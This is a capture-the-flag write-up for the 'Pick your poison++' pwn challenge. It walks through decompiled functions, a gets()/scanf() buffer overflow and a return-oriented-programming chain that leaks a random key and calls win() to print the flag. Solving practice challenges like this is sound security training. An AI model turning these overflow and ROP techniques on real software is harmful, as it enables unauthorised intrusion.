# Pick your poison++
Pwn

## Challenge 

Ｙｏｕ ｈａｖｅ ｒｅａｃｈｅｄ ｌｅｖｅｌ ２！

nc challs.hats.sg 1307

Recommended Reading:

https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-i386-and-x86-6/2538212#2538212
https://crypto.stanford.edu/~blynn/rop/
Author: Lord_Idiot

## Hint

## Solution

#### Decompile

There are 2 functions that I am interested in: `giveKey()` and `win()`:

`giveKey()` will give a random portion of the key (either the first or second half of the key). So it must be called multiple times to get the full key.

    int giveKey() {
        rewind(*tmp);
        rax = rand();
        if ((rax + (SAR(rax, 0x1f) >> 0x1f) & 0x1) - (SAR(rax, 0x1f) >> 0x1f) == 0x1) {
                printf("Here's the 1st part of the key: ");
                for (var_4 = 0x0; var_4 <= 0x2; var_4 = var_4 + 0x1) {
                        putchar(fgetc(*tmp));
                }
                rax = putchar(0xa);
        }
        else {
                printf("Here's the 2nd part of the key: ");
                fseek(*tmp, 0x3, 0x0);
                for (var_8 = 0x0; var_8 <= 0x2; var_8 = var_8 + 0x1) {
                        putchar(fgetc(*tmp));
                }
                rax = putchar(0xa);
        }
        return rax;
    }

`win()` takes in an argument from the above, and then if the argument matches the key, it will print the flag.

    int win(int arg0) {
        rewind(*tmp);
        var_10 = 0x0;
        fread(&var_10, 0x6, 0x1, *tmp);
        if (var_10 == arg0) {
                memset(&var_80, 0x0, 0x64);
                read(open("./flag", 0x0), &var_80, 0x63);
                printf("Here you go! %s", &var_80);
        }
        else {
                puts("Your key is invalid!");
        }
        rax = *tmp;
        rax = fclose(rax);
        return rax;
    }


---

We have to do ROP to `giveKey()` and pass it to `win()`.

From `choice_0, choice_1, choice_2`, we see that only `choice_0()` and `choice_1()` are vulnerable: gets() and scanf() buffer overflow.

They also only allow to be called once (afterwhich, they will print "You've done this already!").

    int choice_0() {
        if (*(int32_t *)(sign_extend_32(*(int32_t *)choice) * 0x4 + 0x6021e0) != 0x0) {
                puts("You've done this already!");
                rax = exit(0xffffffff);
        }
        else {
                *(int32_t *)(sign_extend_32(*(int32_t *)choice) * 0x4 + 0x6021e0) = 0x1;
                puts(0x4017c0);
                printf("Say> \"");
                gets(&var_70);
                strlen(&var_70) + 0x6;
                rax = printf(0x4018af);
        }
        return rax;
    }

#### Offset


#### Return to main()

Initially, I did ROP in this sequence: choice_0(), go to giveKey(), return to main(), choice_1(), go to giveKey().

In this case, it both returned 1st part of the key but notice that both are different.

    CHOICE: 0
    b"'s the 1st part of the key: "
    b'\x1a\x95\x12'

    CHOICE: 1
    b"'s the 1st part of the key: "
    b'\xb9\xf3='

They are different because the key is reinitialised to a random value every time `main()` is called. This is done in `banner()`.

    int main() {
        rax = banner();

        *(int32_t *)choice = menu();
        if (*(int32_t *)choice == 0x1) goto loc_40118e;

    loc_401179:
        if (*(int32_t *)choice == 0x2) goto loc_40119a;

    loc_40117e:
        if (*(int32_t *)choice == 0x0) {
                rax = 0x0;
                rax = choice_0();
        }
        else {
                rax = puts("Invalid poison!");
        }

        // ... more code ...
    }

    int banner() {
        alarm(0x3c);
        time(0x0);
        srand(rax);
        *tmp = tmpfile();
        if (*tmp == 0x0) {
            rax = exit(0xffffffff);
        } else {
            rax = 0x0;
            var_8 = open("/dev/urandom", 0x0);
            for (var_4 = 0x0; var_4 <= 0x5; var_4 = var_4 + 0x1) {
                    rax = read(var_8, &var_9, 0x1);
                    rax = fputc(sign_extend_64(var_9 & 0xff), *tmp);
            }
            rax = *tmp;
            rax = rewind(rax);
            rax = close(var_8);
            rax = puts("...");
            rax = puts(0x4016d8);
        }
        return rax;
    }

Hence, I decided not to ROP back to `main()`, but to `main()+0xE`. Aka, the address after banner(). This is to avoid banner being called. Hence, the key will remain the same.

    0000000000401159         call       banner                                      ; banner
    000000000040115e         mov        eax, 0x0
    0000000000401163         call       menu   

#### ROP gadgets

This is a 64-bit system, so the parameters need to be pop-ed onto RDI.

    # ROPgadget --binary ./poisonpp | grep 'pop rdi'
    0x00000000004013e3 : pop rdi ; ret


#### Solving

Doing 2 ROPs.

    ROP for menu choice 0
        padding
        giveKey()     // giveKey() multiple times so we can
        giveKey()     // get both part1 and part2 which are
        giveKey()     // randomly returned.
        giveKey()
        main()+0xE    // return to main

    ROP for menu choice 1
        padding
        pop rdi
        final key
        win()

Run the script.

    $ python3 solve_pp.py
    0 b'"\x1b[s\x1b[1A\x1b[129C"\x1b[uHere\'s the 1st part of the key: C\x92^\n'
    Found 1st: b'C\x92^'
    1 b"Here's the 1st part of the key: C\x92^\n"
    Found 1st: b'C\x92^'
    2 b"Here's the 1st part of the key: C\x92^\n"
    Found 1st: b'C\x92^'
    3 b"Here's the 2nd part of the key: j[.\n"
    Found 2st: b'C\x92^'
    b"+------------+---------------------+\n| > Poison   |   0. Old Man Gets   |\n|   Exit     |   1. Sir Ken F      |\n|            |   2. St. R. Copy    |\n+------------+---------------------+\nChoice> Whomst'd've goes there? Speak!\nSay> "
    b'"\x1b[s\x1b[1A\x1b[129C"\x1b[uHere you go! HATS{pwn_pwn_pwn :D}\n'
    *** Connection closed by remote host ***

## Flag

    HATS{pwn_pwn_pwn :D}
